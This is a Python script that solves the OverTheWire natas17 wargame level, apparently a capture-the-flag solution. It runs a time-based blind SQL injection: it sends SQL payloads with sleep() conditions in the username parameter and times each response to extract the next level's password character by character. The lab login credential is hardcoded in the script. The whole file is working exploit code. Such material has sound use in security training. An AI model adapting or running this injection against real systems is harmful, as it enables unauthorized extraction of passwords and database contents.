#!/bin/python
import requests

url = "http://natas17.natas.labs.overthewire.org"
auth_username = "natas17"
auth_password = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"

characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

password = ""

iter = 1

test = True
while test:
    test = False
    for i in characters:
        uri = url + "?debug=true"
        r = requests.get(
            uri,
            auth=(auth_username, auth_password),
            params={
                "username": "natas18\" and IF(SUBSTR(password, 1, "
                + str(iter)
                + ")=\""
                + password
                + i
                + "\", sleep(6), FALSE) and username = \"natas18"
            },
        )
        # print(r.text)
        print("Letter", i, r.elapsed.total_seconds())
        if r.elapsed.total_seconds() > 6:
            test = True
            iter += 1
            password += i
            print("password:", password, flush=True)

print("password:", password)
